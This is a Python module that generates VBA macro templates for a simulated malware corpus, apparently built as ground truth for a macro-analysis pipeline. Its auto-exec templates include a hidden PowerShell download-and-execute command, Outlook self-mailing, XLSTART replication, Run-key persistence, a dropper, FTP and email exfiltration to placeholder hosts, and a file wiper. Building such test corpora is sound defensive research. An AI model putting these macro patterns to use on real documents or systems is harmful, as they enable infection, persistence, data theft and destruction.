"""VBA source templates for the controlled macro corpus.

Every "malicious" family here is a SIMULATED, harmless variant of a real
attack pattern (payloads are inert markers, URLs point at 127.0.0.1 /
example.com, "encryption" is a reversible XOR on sandbox-only files). The
corpus is safe to execute in any environment and exists to provide
CONTROLLED GROUND TRUTH (experiment E5) for the Oblivion-X pipelines.

Families mirror the taxonomy of the Oblivion paper (Section 5.3) plus the
behavior catalog in common.py.
"""
from __future__ import annotations

from typing import Dict, Optional

# ---------------------------------------------------------------------------
# Shared fragments
# ---------------------------------------------------------------------------

POWERSHELL_DOWNLOAD = (
    '    Dim cmd As String\r\n'
    '    Dim objShell As Object\r\n'
    '    Dim url As String, outPath As String\r\n'
    '    url = "http://127.0.0.1:9090/payload.exe"\r\n'
    '    outPath = Environ("TEMP") & "\\oblivionx_payload.exe"\r\n'
    '    cmd = "powershell.exe -NoProfile -WindowStyle Hidden " & _\r\n'
    '          "-ExecutionPolicy Bypass -Command " & Chr(34) & _\r\n'
    '          "(New-Object System.Net.WebClient).DownloadFile(\x27" & url & "\x27,\x27" & outPath & "\x27); " & _\r\n'
    '          "Invoke-Item \x27" & outPath & "\x27" & Chr(34)\r\n'
    '    Set objShell = CreateObject("WScript.Shell")\r\n'
    '    objShell.Run cmd, 0, False\r\n'
)

MSGBOX_GATE = (
    '    If MsgBox("Do you want to enable this content?", vbYesNo) <> vbYes Then\r\n'
    '        Exit Sub\r\n'
    '    End If\r\n'
)

# ---------------------------------------------------------------------------
# Word entry helper
# ---------------------------------------------------------------------------

def _word_entry(body: str, interaction: bool = False,
                date_gate: bool = False) -> str:
    gate = MSGBOX_GATE if interaction else ""
    date_block = ""
    if date_gate:
        date_block = (
            '    If Not (Day(Date) = 13 And Month(Date) = 12) Then\r\n'
            '        Exit Sub\r\n'
            '    End If\r\n'
        )
    return (gate + date_block + body)


# ---------------------------------------------------------------------------
# Family templates.  Each returns the body of the Document_Open /
# Workbook_Open handler (the document module), given the target host.
# ---------------------------------------------------------------------------

def donoff_downloader_body() -> str:
    return POWERSHELL_DOWNLOAD


def metacol_mailer_body() -> str:
    return (
        '    Dim olApp As Object, olMail As Object\r\n'
        '    On Error Resume Next\r\n'
        '    Set olApp = CreateObject("Outlook.Application")\r\n'
        '    Set olMail = olApp.CreateItem(0)\r\n'
        '    olMail.To = "recipient@example.com"\r\n'
        '    olMail.Subject = "Invoice"\r\n'
        '    olMail.Body = "Please find the attached document."\r\n'
        '    olMail.Attachments.Add ActiveDocument.FullName\r\n'
        '    olMail.Send\r\n'
    )


def laroux_replicator_body() -> str:
    return (
        '    Dim dst As String\r\n'
        '    dst = Environ("APPDATA") & "\\Microsoft\\Excel\\XLSTART\\oblivionx_infected.xlsm"\r\n'
        '    ThisWorkbook.SaveCopyAs dst\r\n'
    )


def locky_ransom_body() -> str:
    return (
        '    Dim ws As Object\r\n'
        '    Dim fPath As String, data As String, enc As String\r\n'
        '    Dim i As Long\r\n'
        '    Set ws = CreateObject("WScript.Shell")\r\n'
        '    ws.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\oblivionx", "\"" & Environ("TEMP") & "\\oblivionx_lock.exe\"", "REG_SZ"\r\n'
        '    fPath = Environ("TEMP") & "\\oblivionx_vault\\secret.txt"\r\n'
        '    data = "top secret marker data"\r\n'
        '    enc = ""\r\n'
        '    For i = 1 To Len(data)\r\n'
        '        enc = enc & Chr(Asc(Mid(data, i, 1)) Xor 42)\r\n'
        '    Next i\r\n'
        '    Open fPath For Output As #1\r\n'
        '    Print #1, enc\r\n'
        '    Close #1\r\n'
    )


def vba_dropper_body() -> str:
    return (
        '    Dim f As Integer, exe As String\r\n'
        '    exe = Environ("TEMP") & "\\oblivionx_stub.exe"\r\n'
        '    f = FreeFile\r\n'
        '    Open exe For Binary As #f\r\n'
        '    Put #f, , "MZ-this-is-an-inert-marker-stub"\r\n'
        '    Close #f\r\n'
        '    Shell exe, 0\r\n'
    )


def marker_ftp_body() -> str:
    return (
        '    Dim f As Integer, logPath As String\r\n'
        '    logPath = Environ("TEMP") & "\\oblivionx_log.txt"\r\n'
        '    f = FreeFile\r\n'
        '    Open logPath For Output As #f\r\n'
        '    Print #f, "marker-ftp-log: simulated exfiltration data"\r\n'
        '    Close #f\r\n'
        '    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\\oblivionx_ftp.txt", 0\r\n'
    )


def thus_wiper_body() -> str:
    return (
        '    Kill Environ("TEMP") & "\\oblivionx_wipe_test\\*.*"\r\n'
    )


def valyria_dual_body() -> str:
    return (
        '    Dim http As Object, url As String\r\n'
        '    Dim olApp As Object, olMail As Object\r\n'
        '    On Error Resume Next\r\n'
        '    url = "http://127.0.0.1:9090/second-stage.bin"\r\n'
        '    Set http = CreateObject("MSXML2.XMLHTTP")\r\n'
        '    http.Open "GET", url, False\r\n'
        '    http.Send\r\n'
        '    Set olApp = CreateObject("Outlook.Application")\r\n'
        '    Set olMail = olApp.CreateItem(0)\r\n'
        '    olMail.To = "exfil@example.com"\r\n'
        '    olMail.Subject = "logs"\r\n'
        '    olMail.Body = http.Status\r\n'
        '    olMail.Send\r\n'
    )


def benign_formatting_body(host: str = "word") -> str:
    if host == "excel":
        return (
            '    Dim rng As Object\r\n'
            '    On Error Resume Next\r\n'
            '    Set rng = ActiveSheet.Range("A1:B10")\r\n'
            '    rng.Copy\r\n'
            '    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, _\r\n'
            '        Filename:="C:\\Users\\Public\\oblivionx_format.pdf"\r\n'
        )
    return (
        '    Dim rng As Object\r\n'
        '    On Error Resume Next\r\n'
        '    Set rng = ActiveDocument.Range\r\n'
        '    rng.Copy\r\n'
        '    ActiveDocument.ExportAsFixedFormat OutputFileName:= _\r\n'
        '        "C:\\Users\\Public\\oblivionx_format.pdf", ExportFormat:=wdExportFormatPDF\r\n'
    )


def benign_report_body(host: str = "word") -> str:
    if host == "excel":
        return (
            '    Dim rng As Object\r\n'
            '    Set rng = ActiveSheet.Range("A1:D20")\r\n'
            '    rng.Copy\r\n'
            '    ActiveSheet.PrintOut\r\n'
            '    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, _\r\n'
            '        Filename:="C:\\Users\\Public\\oblivionx_report.pdf"\r\n'
        )
    return (
        '    Dim rng As Object\r\n'
        '    Set rng = ActiveDocument.Range\r\n'
        '    rng.Copy\r\n'
        '    ActiveDocument.PrintOut\r\n'
        '    ActiveDocument.ExportAsFixedFormat OutputFileName:= _\r\n'
        '        "C:\\Users\\Public\\oblivionx_report.pdf", ExportFormat:=wdExportFormatPDF\r\n'
    )


def broken_semantic_body() -> str:
    return (
        '    Call UndefinedSubroutineName\r\n'
    )


def slow_timeout_body() -> str:
    return (
        '    Dim i As Long\r\n'
        '    Dim dummy As Double\r\n'
        '    For i = 1 To 300000000\r\n'
        '        dummy = dummy + i * 0.000001\r\n'
        '    Next i\r\n'
        '    \' only reached if the busy loop is allowed to finish\r\n'
        '    Shell "cmd /c echo oblivionx-timeout-marker", 0\r\n'
    )


def empty_body() -> str:
    return ""


# ---------------------------------------------------------------------------
# Full module sources
# ---------------------------------------------------------------------------

def build_document_module(family: str, host: str) -> str:
    """ThisDocument / ThisWorkbook source with the auto-exec entry point."""
    bodies: Dict[str, str] = {
        "donoff_downloader": donoff_downloader_body(),
        "metacol_mailer": metacol_mailer_body(),
        "laroux_replicator": laroux_replicator_body(),
        "locky_ransom": locky_ransom_body(),
        "vba_dropper": vba_dropper_body(),
        "marker_ftp": marker_ftp_body(),
        "thus_wiper": thus_wiper_body(),
        "valyria_dual": valyria_dual_body(),
        "donoff_interaction": donoff_downloader_body(),
        "benign_formatting": benign_formatting_body(host),
        "benign_report": benign_report_body(host),
        "broken_semantic": broken_semantic_body(),
        "empty_macro": empty_body(),
        "slow_timeout": slow_timeout_body(),
    }
    body = bodies[family]
    name = "ThisDocument" if host == "word" else "ThisWorkbook"
    if family == "empty_macro":
        # A macro project that exists but contains no code at all: the
        # Oblivion "empty" pre-processing class (E1) / static_empty (E7).
        return f'Attribute VB_Name = "{name}"\r\n'
    if family == "donoff_interaction":
        body = _word_entry(body, interaction=True)
    elif family == "thus_wiper":
        body = _word_entry(body, date_gate=True)
    else:
        body = _word_entry(body)
    entry = "Private Sub Document_Open()" if host == "word" else \
            "Private Sub Workbook_Open()"
    name = "ThisDocument" if host == "word" else "ThisWorkbook"
    return (f'Attribute VB_Name = "{name}"\r\n'
            f"{entry}\r\n{body}End Sub\r\n")


def build_helper_module(family: str, host: str) -> str:
    """A procedural module (NewMacros) with family helper code, present so
    the project has more than one module (realistic structure)."""
    helper = {
        "donoff_downloader": 'Public Function BuildCmd(ByVal s As String) As String\r\n    BuildCmd = s & Chr(34)\r\nEnd Function\r\n',
        "donoff_interaction": 'Public Function BuildCmd(ByVal s As String) As String\r\n    BuildCmd = s & Chr(34)\r\nEnd Function\r\n',
        "valyria_dual": 'Public Function BuildCmd(ByVal s As String) As String\r\n    BuildCmd = s\r\nEnd Function\r\n',
        "locky_ransom": 'Public Function XorChar(ByVal c As String) As String\r\n    XorChar = Chr(Asc(c) Xor 42)\r\nEnd Function\r\n',
        "metacol_mailer": 'Public Function MakeSubject() As String\r\n    MakeSubject = "Invoice"\r\nEnd Function\r\n',
        "vba_dropper": 'Public Function StubPath() As String\r\n    StubPath = Environ("TEMP") & "\\oblivionx_stub.exe"\r\nEnd Function\r\n',
        "marker_ftp": 'Public Function LogPath() As String\r\n    LogPath = Environ("TEMP") & "\\oblivionx_log.txt"\r\nEnd Function\r\n',
        "benign_formatting": 'Public Function FmtName() As String\r\n    FmtName = "report"\r\nEnd Function\r\n',
    }.get(family, 'Public Sub OblivionXHelper()\r\n    \' inert helper\r\nEnd Sub\r\n')
    if family == "empty_macro":
        helper = ""
    return f'Attribute VB_Name = "NewMacros"\r\n{helper}'


def build_sample_sources(family: str, host: str):
    """Return (document_module_name, document_source, helper_source)."""
    return (("ThisDocument" if host == "word" else "ThisWorkbook"),
            build_document_module(family, host),
            build_helper_module(family, host))
